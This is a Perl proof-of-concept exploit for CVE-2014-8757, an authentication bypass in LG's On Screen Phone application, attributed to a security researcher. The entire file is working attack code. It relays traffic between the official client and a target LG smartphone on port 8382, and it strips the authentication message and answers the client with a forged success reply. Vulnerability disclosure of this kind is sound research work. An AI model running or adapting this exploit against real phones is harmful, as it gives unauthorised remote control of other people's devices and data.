#!/usr/bin/perl
#
# PoC code for LG On Screen Phone authentication bypass vulnerability (CVE-2014-8757), 
# discovered by Imre Rad, Search-Lab Ltd.
#
# This script excepts that the official LG On Screen Phone application would connect to it,
# which is possible by running osp-discovery.pl.
#
# As first parameter you need to specify the real IP address of the targeted LG smartphone
# running On Screen Phone 4.3.009 (incl) and below.
#

use strict;
use warnings;
use IO::Socket::INET;
use IO::Select;

my $phone_ip = $ARGV[0];
my $debug = $ARGV[1];
my $legit = $ARGV[2] || 0;
die "Usage: $0 ip_address [debug] [legit]" if(!$phone_ip);


my $server =  IO::Socket::INET->new(
	Listen => 1,
	LocalPort => 8382,
	Proto => 'tcp',
	Reuse => 1
);


while(1)
{
   
   my $ospclient = $server->accept();

   my $phone = new IO::Socket::INET (
		PeerHost => $phone_ip,
		PeerPort => 8382,
		Proto => 'tcp',
		) or die "ERROR in Socket Creation : $!\n";
   
   my $sel = new IO::Select();
   $sel->add($ospclient);
   $sel->add($phone);
   
   eval {
	   while(1) {
		  my @s = $sel->can_read();
		  for my $sock (@s) {
			 my $data = myrecv($sock);
			 if((!$legit)&&($data =~ /^\x18\x00\x1c\x96\xdd\x82\xc2\x31/)) {
			   print "Skipping authentication message!\n";
			   mysend($ospclient, "
    0000001E  19 00 04 02                                      ....
");
			 } else {
			   mysendb($sock == $phone ? $ospclient : $phone, $data);
			 }
		  }   
	   }
   };
   if($@) {
     print "ERROR: $@\n";
   }
   
   $ospclient->close();
   $phone->close();
   
   
}

sub mysendb {
  my $sock = shift;
  my $bin = shift;
	
  print ">> ".unpack("H*", $bin)."\n\n"  if($debug);
  print $sock $bin or die "couldnt write: $@" ;
}

sub mysend {
  my $sock = shift;
  my $msg = shift;
  my $bin = "";
  $msg =~ s/^\s*[0-9a-f]{8} //gm;
  while($msg =~ /([0-9a-f]{2}) /g) {
     $bin .= pack("H*",$1);
  }

  mysendb($sock, $bin);  
}


sub myrecv {
  my $sock = shift;
  $sock->sysread(my $re, 4096) or die "couldnt read: $@";
  print "<< ".unpack("H*", $re)."\n" if($debug);
  print "<<ASCII: $re\n\n" if($debug);
  return $re;
}
